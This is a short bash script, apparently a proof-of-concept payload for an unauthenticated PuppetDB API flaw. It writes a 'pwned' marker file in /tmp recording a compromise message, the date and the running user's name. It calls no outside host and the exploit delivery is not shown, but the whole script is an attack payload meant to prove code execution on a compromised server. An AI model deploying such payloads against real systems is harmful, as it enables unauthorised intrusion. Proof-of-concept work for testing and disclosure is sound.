#!/bin/bash
touch /tmp/pwned_by_puppetdb
echo "Compromised by PuppetDB unauthenticated API at $(date)" > /tmp/pwned_by_puppetdb
whoami >> /tmp/pwned_by_puppetdb
